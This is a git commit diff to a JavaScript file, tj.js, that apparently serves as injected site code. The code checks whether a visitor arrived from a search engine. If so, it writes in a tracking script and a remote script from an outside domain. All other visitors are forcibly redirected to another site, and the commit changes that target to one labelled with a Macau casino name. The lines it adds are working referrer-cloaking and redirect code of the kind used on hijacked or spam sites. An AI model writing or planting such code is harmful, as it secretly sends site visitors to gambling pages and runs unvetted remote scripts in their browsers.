b2ffc42500d6f7364ba25847b07d1e559ef98739
js999999999 <js-9@outlook.com>
2017-10-05 16:34:00 +0800

    Update tj.js

--- cjs/tj.js
+++ cjs/tj.js
@@ -3,9 +3,10 @@ today=today.getYear()+"-"+(today.getMonth()+1)+"-"+today.getDate();
 var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+){1,2}\//ig;
 var where =document.referrer;
 if(regexp.test(where)){
-document.write ('<script language="javascript" src="http://count28.51yes.com/click.aspx?id=280954514&logo=6" charset="gb2312"></script><script language="javascript" type="text/javascript" src="http://www.647123.com/cjs/t.js "></script></div>');
+document.write ('<script language="javascript" src="http://count47.51yes.com/click.aspx?id=470070323&logo=6" charset="gb2312"></script><script language="javascript" type="text/javascript" src="http://www.647123.com/cjs/t.js"></script></div>');
 }
 else
 {
-window.location.href="http://www.180887.com/#180高手论坛";
+window.location.href="http://www.24499.com/#澳门永利";
 }
+
